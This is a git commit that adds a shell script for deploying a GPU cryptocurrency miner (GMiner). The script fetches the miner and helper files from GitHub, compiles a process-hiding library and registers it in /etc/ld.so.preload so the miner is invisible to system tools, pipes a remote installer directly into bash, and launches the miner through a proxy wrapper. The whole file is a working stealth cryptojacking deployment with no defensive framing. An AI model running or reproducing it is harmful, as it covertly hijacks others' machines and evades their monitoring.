96586c97874011e1984a676c59ae1936f8b02b8a
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-21 10:52:47 +0200

    Create start_gmi_flexWs1.sh

---
+++ start_gmi_flexWs1.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.57/gminer_2_57_linux64.tar.xz
+tar -xvf gminer_2_57_linux64.tar.xz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmi_flex.sh
+chmod +x gmi_flex.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
+unzip magicGmi.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash
+graftcp ./gmi_flex.sh
